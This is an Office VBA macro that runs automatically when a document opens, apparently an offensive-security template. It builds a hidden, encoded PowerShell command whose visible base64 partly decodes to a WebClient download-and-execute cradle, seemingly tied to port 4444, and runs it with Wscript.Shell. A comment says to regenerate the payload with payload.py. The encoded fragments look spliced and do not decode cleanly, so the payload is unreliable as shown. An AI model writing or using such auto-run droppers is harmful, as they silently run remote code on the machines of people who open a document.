Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    ' edit the payload.py inputs to produce the right output here
    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
        Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
        Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
        Str = Str + "A"
    CreateObject("Wscript.Shell").Run Str
End Sub
